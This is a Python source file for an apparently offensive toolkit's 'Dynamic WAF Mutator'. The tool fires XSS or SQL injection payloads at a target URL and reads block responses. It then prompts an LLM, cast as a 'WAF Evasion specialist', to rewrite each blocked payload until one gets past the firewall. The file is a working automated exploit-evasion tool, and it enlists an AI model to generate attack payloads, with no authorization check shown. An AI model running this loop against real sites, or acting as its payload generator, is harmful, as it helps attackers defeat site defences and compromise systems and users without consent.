"""tools/dynamic_waf_mutator.py

Dynamic WAF Bypass Payload Mutator.
===================================
Real-time AI-driven payload mutation that adaptively bypasses Web Application Firewalls (WAFs).
Uses feedback from response codes and headers in a loop with the Universal AI Client.
"""

from __future__ import annotations

import asyncio
import json
import logging
from pathlib import Path
from typing import Any, Dict, List, Union

from tools.tool_registry import (
    BaseTool,
    ToolCategory,
    ToolMetadata,
    ToolPriority,
    ToolResult,
    register_tool,
)
from tools.universal_ai_client import AIClientManager, AIMessage
from tools.waf_evasion import WAFEvasionEngine
from tools.waf_signatures import detect_waf_from_response
from cli.ui_components import print_error, print_info, print_success, print_warning

logger = logging.getLogger("elengenix.dynamic_waf_mutator")


class DynamicWAFMutator:
    """
    Adaptive AI-driven real-time WAF evasion mutator.
    Dynamically mutates exploit payloads using real-time LLM reasoning and WAF blocking feedback.
    """

    def __init__(self, base_url: str, rate_limit_rps: float = 0.5):
        """
        Initialize the Dynamic WAF Mutator.

        Args:
            base_url: Target base URL for sending payloads.
            rate_limit_rps: Rate limit request interval.
        """
        self.base_url = base_url
        self.evasion_engine = WAFEvasionEngine(base_url=base_url, rate_limit_rps=rate_limit_rps)
        self.ai_manager = AIClientManager()
        self.history: List[Dict[str, Any]] = []

    def _is_blocked(self, status_code: int, body: str) -> bool:
        """
        Check if the HTTP response indicates a WAF block.

        Args:
            status_code: HTTP response status code.
            body: HTTP response body snippet.

        Returns:
            True if blocked, False otherwise.
        """
        # Common WAF block status codes
        if status_code in (403, 406, 409, 501, 502, 503):
            return True

        # Generic heuristic checks
        body_lower = body.lower()
        block_triggers = [
            "blocked by waf",
            "cloudflare ray",
            "mod_security",
            "access denied",
            "incident id",
            "sucuri cloudproxy",
            "security gate",
            "activity blocked",
        ]
        return any(trigger in body_lower for trigger in block_triggers)

    def _build_evasion_prompt(
        self,
        failed_payload: str,
        vuln_type: str,
        waf_name: str,
        status_code: int,
        headers: str,
        body_snippet: str,
        attempt: int,
    ) -> List[AIMessage]:
        """
        Build a high-context prompt for the WAF evasion LLM.

        Args:
            failed_payload: The mutated payload that got blocked.
            vuln_type: Type of vulnerability (SQLi, XSS, etc.).
            waf_name: Name of detected WAF if available.
            status_code: HTTP status code from WAF.
            headers: Serialized response headers.
            body_snippet: HTML/Response body snippet from block response.
            attempt: Current iteration attempt count.

        Returns:
            List of AIMessages for the client.
        """
        system_content = (
            "You are a Senior WAF Evasion specialist and Exploit Evasion analyst.\n"
            "Your objective is to mutate the blocked exploit payload to successfully bypass WAF filters while keeping the core exploit semantics intact.\n"
            "You must return ONLY a JSON block containing the next mutation payload candidate and your technical reasoning. Do not output anything else."
        )

        user_content = (
            f"Vulnerability Context: {vuln_type}\n"
            f"Failed Payload (Attempt {attempt}): {failed_payload}\n"
            f"WAF Detected: {waf_name or 'Generic/Unknown WAF'}\n"
            f"Block Response Status: {status_code}\n"
            f"Block Response Headers: {headers[:500]}\n"
            f"Block Response Snippet: {body_snippet[:800]}\n\n"
            "Analyze the failure. Determine which character sequence, regex pattern, or signature triggered the WAF block (e.g. script tag, OR statement, quotes, union keywords).\n"
            "Devise a sophisticated mutation bypass technique. Consider alternate encodings (double URL encode, HTML entity, unicode escape), case randomization, comment injections, SQL function replacements, JS payload alternatives, or white-space obfuscations.\n\n"
            "Return your response strictly in the following JSON format:\n"
            "{\n"
            '  "mutated_payload": "YOUR_NEW_MUTATED_PAYLOAD_HERE",\n'
            '  "reasoning": "Brief technical reasoning explaining why this mutation bypasses the blocking signature"\n'
            "}"
        )

        return [
            AIMessage(role="system", content=system_content),
            AIMessage(role="user", content=user_content),
        ]

    async def run_mutation_loop(
        self,
        target_path: str,
        base_payload: str,
        vuln_type: str = "Cross-Site Scripting",
        max_attempts: int = 5,
    ) -> Dict[str, Any]:
        """
        Run the interactive real-time AI feedback mutation loop to bypass WAF.

        Args:
            target_path: Sub-path or query parameter target context.
            base_payload: Standard starting proof-of-concept payload.
            vuln_type: Category of payload to optimize.
            max_attempts: Max loop attempts before giving up.

        Returns:
            Result dict with outcome indicators.
        """
        current_payload = base_payload
        target_url = self.base_url.rstrip("/") + "/" + target_path.lstrip("/")

        print_info(f"Starting Dynamic WAF Mutator loop against: {target_url}")
        print_info(f"Target Vulnerability: {vuln_type}")
        print_info(f"Base Exploit Payload: {base_payload}")

        waf_name = None

        for attempt in range(1, max_attempts + 1):
            logger.info(f"WAF Mutation loop attempt {attempt} running...")

            # Send current payload
            status, text, headers = self.evasion_engine._send_probe(target_url, current_payload)
            blocked = self._is_blocked(status, text)

            # Auto detect WAF from response
            detected, conf = detect_waf_from_response(headers, text)
            if detected:
                waf_name = detected
                logger.info(f"Detected WAF in response: {waf_name} (conf={conf})")

            # Check if successfully bypassed!
            if not blocked and status > 0:
                print_success(f"[OK] WAF Bypass achieved at attempt {attempt}!")
                print_success(f"     Payload: {current_payload}")
                print_success(f"     Status : {status}")
                return {
                    "success": True,
                    "bypass_payload": current_payload,
                    "attempts": attempt,
                    "waf_type": waf_name,
                    "status_code": status,
                    "history": self.history,
                }

            # If blocked, record history and request AI mutation
            print_warning(
                f"[WARN] Attempt {attempt} got blocked (Status: {status}). Requesting AI mutation..."
            )

            # Record failed attempt details
            serialized_headers = json.dumps(headers)
            attempt_record = {
                "attempt": attempt,
                "payload": current_payload,
                "status_code": status,
                "blocked": True,
                "waf_type": waf_name,
            }
            self.history.append(attempt_record)

            # Request LLM bypass candidate
            messages = self._build_evasion_prompt(
                failed_payload=current_payload,
                vuln_type=vuln_type,
                waf_name=waf_name,
                status_code=status,
                headers=serialized_headers,
                body_snippet=text,
                attempt=attempt,
            )

            try:
                # Call UniversalAIClient
                response = self.ai_manager.chat(messages, temperature=0.7)
                content = response.content.strip()

                # Parse JSON block
                if "```json" in content:
                    content = content.split("```json")[1].split("```")[0].strip()
                elif "```" in content:
                    content = content.split("```")[1].split("```")[0].strip()

                parsed = json.loads(content)
                next_payload = parsed.get("mutated_payload", "")
                reasoning = parsed.get("reasoning", "")

                if not next_payload:
                    raise ValueError("No mutated_payload returned by LLM")

                print_info(f"[INFO] AI Reasoning: {reasoning}")
                print_info(f"[RUN] Mutated payload: {next_payload}")

                current_payload = next_payload

            except Exception as e:
                print_error(f"[FAIL] AI Mutation generation failed: {e}")
                # Fallback to rule-based mutator if AI fails
                variants = self.evasion_engine.generate_mutations(
                    current_payload, waf_name, max_variants=5
                )
                if len(variants) > 1:
                    current_payload = variants[1][0]
                    print_warning(f"Fallback: Using rule-based mutation payload: {current_payload}")
                else:
                    break

        print_error(f"[FAIL] Failed to bypass WAF after {max_attempts} attempts.")
        return {
            "success": False,
            "bypass_payload": None,
            "attempts": max_attempts,
            "waf_type": waf_name,
            "history": self.history,
        }


@register_tool(
    ToolMetadata(
        name="dynamic_waf_mutator",
        category=ToolCategory.EXPLOITATION,
        priority=ToolPriority.HIGH,
        binary_name="python3",  # Dynamic tool uses python environment, always available
        description="Adaptive AI-driven real-time WAF evasion mutator",
        timeout_seconds=300,
    )
)
class DynamicWAFMutatorTool(BaseTool):
    """
    Dynamic WAF Bypass Mutator plugin wrapping the AI loop into the Elengenix tool registry.
    """

    def _check_binary(self) -> bool:
        """Override since this is a pure Python native tool plugin."""
        return True

    async def execute(
        self,
        target: Union[str, List[str]],
        report_dir: Path,
        semaphore: asyncio.Semaphore,
        **kwargs,
    ) -> ToolResult:
        """
        Execute the dynamic WAF mutator tool.

        Args:
            target: Target base URL.
            report_dir: Path to write reports/findings.
            semaphore: asyncio Semaphore for concurrency.
            **kwargs: Extra arguments: payload, vuln_type, path.

        Returns:
            ToolResult containing bypass outcomes.
        """
        import time

        start_time = time.time()

        base_url = target if isinstance(target, str) else target[0]
        vuln_type = kwargs.get("vuln_type", "Cross-Site Scripting")
        base_payload = kwargs.get("payload", "<script>alert(1)</script>")
        target_path = kwargs.get("path", "")
        max_attempts = kwargs.get("max_attempts", 5)

        mutator = DynamicWAFMutator(base_url=base_url)

        async with semaphore:
            # Run the synchronous mutation loop in the executor thread pool
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                None,
                lambda: asyncio.run(
                    mutator.run_mutation_loop(
                        target_path=target_path,
                        base_payload=base_payload,
                        vuln_type=vuln_type,
                        max_attempts=max_attempts,
                    )
                ),
            )

        execution_time = time.time() - start_time
        output_file = report_dir / "dynamic_waf_bypass_results.json"

        # Save output
        try:
            output_file.write_text(json.dumps(result, indent=2))
        except Exception:
            pass

        findings = []
        if result.get("success"):
            findings.append(
                {
                    "vuln_type": vuln_type,
                    "bypass_payload": result.get("bypass_payload"),
                    "attempts_needed": result.get("attempts"),
                    "waf_type": result.get("waf_type"),
                }
            )

        return ToolResult(
            success=result.get("success", False),
            tool_name=self.metadata.name,
            category=self.metadata.category,
            output=json.dumps(result, indent=2),
            findings=findings,
            execution_time=execution_time,
            raw_output_file=output_file if output_file.exists() else None,
        )
